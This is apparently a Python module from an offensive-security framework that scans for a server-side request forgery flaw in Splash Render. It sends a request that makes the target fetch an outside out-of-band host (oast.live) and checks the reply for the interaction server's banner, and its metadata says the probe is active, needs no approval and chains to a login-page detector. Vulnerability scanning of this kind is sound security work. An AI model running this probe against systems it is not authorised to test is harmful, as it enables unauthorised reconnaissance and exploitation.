#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Splash Render is vulnerable to Server-Side Request Forgery (SSRF) Vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Splash Render - SSRF Detection',
        'description': 'Splash Render is vulnerable to Server-Side Request Forgery (SSRF) Vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'splash', 'ssrf', 'oast', 'oss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/scrapinghub/splash',
            'https://b1ngz.github.io/splash-ssrf-to-get-server-root-privilege/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/render.html?url=https://oast.live', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Splash Render - SSRF detected",
                path='/render.html?url=https://oast.live',
            )
            return True
        return False

